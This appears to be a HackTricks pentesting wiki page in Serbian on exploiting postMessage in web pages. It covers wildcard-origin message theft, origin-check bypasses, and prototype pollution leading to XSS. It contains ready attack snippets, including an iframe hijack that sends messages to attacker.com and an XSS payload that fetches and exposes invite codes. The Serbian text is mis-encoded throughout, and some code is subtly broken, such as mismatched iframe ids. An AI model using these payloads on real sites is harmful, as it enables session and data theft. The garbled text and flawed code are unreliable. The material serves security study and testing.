# PostMessage Vulnerabilities

## PostMessage Vulnerabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Send **PostMessage**

**PostMessage** koristi sledeÄ‡u funkciju za slanje poruke:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Napomena da **targetOrigin** moÅ¾e biti '\*' ili URL kao Å¡to je _https://company.com._\
U **drugom scenariju**, **poruka se moÅ¾e poslati samo toj domeni** (Äak i ako je izvor objekta prozora drugaÄiji).\
Ako se koristi **wildcard**, **poruke se mogu slati na bilo koju domenu**, i biÄ‡e poslate na izvor objekta Window.

### Napad na iframe & wildcard u **targetOrigin**

Kao Å¡to je objaÅ¡njeno u [**ovom izveÅ¡taju**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), ako pronaÄ‘ete stranicu koja moÅ¾e biti **iframed** (bez zaÅ¡tite `X-Frame-Header`) i koja **Å¡alje osetljive** poruke putem **postMessage** koristeÄ‡i **wildcard** (\*), moÅ¾ete **modifikovati** **izvor** **iframe-a** i **leak** **osetljive** poruke na domenu koju kontroliÅ¡ete.\
Napomena da ako stranica moÅ¾e biti iframed, ali je **targetOrigin** **postavljen na URL i ne na wildcard**, ovaj **trik neÄ‡e raditi**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener eksploatacija

**`addEventListener`** je funkcija koju koristi JS da deklarira funkciju koja **oÄekuje `postMessages`**.\
KoristiÄ‡e se kod sliÄan sledeÄ‡em:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Napomena u ovom sluÄaju kako **prva stvar** koju kod radi je **provera porekla**. Ovo je straÅ¡no **vaÅ¾no** posebno ako stranica planira da uradi **bilo Å¡ta osetljivo** sa primljenim informacijama (kao Å¡to je promena lozinke). **Ako ne proverava poreklo, napadaÄi mogu naterati Å¾rtve da Å¡alju proizvoljne podatke na ove krajnje taÄke** i promene lozinke Å¾rtava (u ovom primeru).

### Enumeracija

Da biste **pronaÅ¡li event listener-e** na trenutnoj stranici moÅ¾ete:

* **PretraÅ¾iti** JS kod za `window.addEventListener` i `$(window).on` (_JQuery verzija_)
* **IzvrÅ¡iti** u konzoli alata za razvoj: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Idite na** _Elements --> Event Listeners_ u alatima za razvoj preglednika

![](<../../.gitbook/assets/image (396).png>)

* Koristite **proÅ¡irenje za preglednik** kao [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ili [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ova proÅ¡irenja za preglednik Ä‡e **presresti sve poruke** i prikazati ih vama.

### ZaobilaÅ¾enje provere porekla

* **`event.isTrusted`** atribut se smatra sigurnim jer vraÄ‡a `True` samo za dogaÄ‘aje koje generiÅ¡u stvarne korisniÄke akcije. Iako je izazovno zaobiÄ‡i ga ako je pravilno implementiran, njegova vaÅ¾nost u bezbednosnim proverama je znaÄajna.
*   KoriÅ¡Ä‡enje **`indexOf()`** za validaciju porekla u PostMessage dogaÄ‘ajima moÅ¾e biti podloÅ¾no zaobilaÅ¾enju. Primer koji ilustruje ovu ranjivost je:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   **`search()`** metoda iz `String.prototype.search()` je namenjena za regularne izraze, a ne za stringove. ProsleÄ‘ivanje bilo Äega osim regexp-a dovodi do implicitne konverzije u regex, Å¡to Äini metodu potencijalno nesigurnom. To je zato Å¡to u regex-u, taÄka (.) deluje kao dÅ¾oker, omoguÄ‡avajuÄ‡i zaobilaÅ¾enje validacije sa posebno kreiranim domenima. Na primer:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* **`match()`** funkcija, sliÄna `search()`, obraÄ‘uje regex. Ako je regex nepravilno strukturiran, moÅ¾e biti podloÅ¾an zaobilaÅ¾enju.
*   **`escapeHtml`** funkcija je namenjena sanitizaciji unosa beÅ¾anjem karaktera. MeÄ‘utim, ona ne stvara novi beÅ¾ani objekat, veÄ‡ prepisuje svojstva postojeÄ‡eg objekta. Ovo ponaÅ¡anje se moÅ¾e iskoristiti. Konkretno, ako se objekat moÅ¾e manipulisati tako da njegova kontrolisana svojstva ne priznaju `hasOwnProperty`, `escapeHtml` neÄ‡e funkcionisati kako se oÄekuje. Ovo je prikazano u primerima ispod:

*   OÄekivani neuspeh:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   ZaobilaÅ¾enje beÅ¾anja:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

U kontekstu ove ranjivosti, `File` objekat je posebno podloÅ¾an eksploataciji zbog svoje read-only `name` osobine. Ova osobina, kada se koristi u Å¡ablonima, nije sanitizovana od strane `escapeHtml` funkcije, Å¡to dovodi do potencijalnih bezbednosnih rizika.
* `document.domain` osobina u JavaScript-u moÅ¾e biti postavljena od strane skripte da skraÄ‡uje domen, omoguÄ‡avajuÄ‡i opuÅ¡teniju primenu politike istog porekla unutar istog roditeljskog domena.

### e.origin == window.origin zaobilaÅ¾enje

Kada se ugraÄ‘uje web stranica unutar **sandboxed iframe** koristeÄ‡i %%%%%%, vaÅ¾no je razumeti da Ä‡e poreklo iframe-a biti postavljeno na null. Ovo je posebno vaÅ¾no kada se radi o **sandbox atributima** i njihovim implikacijama na bezbednost i funkcionalnost.

Specifikovanjem **`allow-popups`** u sandbox atributu, svaki prozor koji se otvori iz iframe-a nasleÄ‘uje sandbox ograniÄenja svog roditelja. To znaÄi da osim ako **`allow-popups-to-escape-sandbox`** atribut nije takoÄ‘e ukljuÄen, poreklo prozora za iskaÄuÄ‡e prozore je takoÄ‘e postavljeno na `null`, usklaÄ‘ujuÄ‡i se sa poreklom iframe-a.

Kao rezultat, kada se iskaÄuÄ‡i prozor otvori pod ovim uslovima i poruka se poÅ¡alje iz iframe-a u iskaÄuÄ‡i prozor koristeÄ‡i **`postMessage`**, i poÅ¡iljalac i primalac imaju svoja porekla postavljena na `null`. Ova situacija dovodi do scenarija gde **`e.origin == window.origin`** se evaluira kao taÄno (`null == null`), jer i iframe i iskaÄuÄ‡i prozor dele istu vrednost porekla `null`.

Za viÅ¡e informacija **proÄitajte**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### ZaobilaÅ¾enje e.source

MoguÄ‡e je proveriti da li je poruka doÅ¡la iz istog prozora u kojem skripta sluÅ¡a (posebno zanimljivo za **Content Scripts iz proÅ¡irenja preglednika** da provere da li je poruka poslata sa iste stranice):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
MoÅ¾ete primorati **`e.source`** poruke da bude null kreiranjem **iframe** koji **Å¡alje** **postMessage** i koji je **odmah obrisan**.

Za viÅ¡e informacija **proÄitajte:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header zaobilaÅ¾enje

Da biste izvrÅ¡ili ove napade, idealno bi bilo da moÅ¾ete **staviti stranicu Å¾rtve** unutar `iframe`. Ali neki headeri poput `X-Frame-Header` mogu **spreÄiti** to **ponaÅ¡anje**.\
U tim scenarijima moÅ¾ete i dalje koristiti manje prikriven napad. MoÅ¾ete otvoriti novu karticu za ranjivu web aplikaciju i komunicirati s njom:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### KraÄ‘a poruke poslata detetu blokiranjem glavne stranice

Na sledeÄ‡oj stranici moÅ¾ete videti kako moÅ¾ete ukrasti **osetljive postmessage podatke** poslata **child iframe** blokiranjem **glavne** stranice pre slanja podataka i zloupotrebom **XSS u detetu** da **iscuri podatke** pre nego Å¡to budu primljeni:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### KraÄ‘a poruke modifikovanjem lokacije iframe-a

Ako moÅ¾ete iframe-ovati veb stranicu bez X-Frame-Header koja sadrÅ¾i drugi iframe, moÅ¾ete **promeniti lokaciju tog child iframe-a**, tako da ako prima **postmessage** poslatu koristeÄ‡i **wildcard**, napadaÄ moÅ¾e **promeniti** tu iframe **izvor** na stranicu **koju kontroliÅ¡e** i **ukrasti** poruku:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Prototype Pollution i/ili XSS

U scenarijima gde se podaci poslati putem `postMessage` izvrÅ¡avaju putem JS, moÅ¾ete **iframe**-ovati **stranicu** i **iskoristiti** **prototip zagaÄ‘enje/XSS** Å¡aljuÄ‡i eksploataciju putem `postMessage`.

Nekoliko **veoma dobro objaÅ¡njenih XSS kroz `postMessage`** moÅ¾e se naÄ‡i na [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Primer eksploatacije za zloupotrebu **Prototype Pollution i zatim XSS** putem `postMessage` na `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Za **viÅ¡e informacija**:

* Link ka stranici o [**prototip zagaÄ‘enju**](../deserialization/nodejs-proto-prototype-pollution/)
* Link ka stranici o [**XSS**](../xss-cross-site-scripting/)
* Link ka stranici o [**klijentskom prototip zagaÄ‘enju do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Reference

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Za veÅ¾banje: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
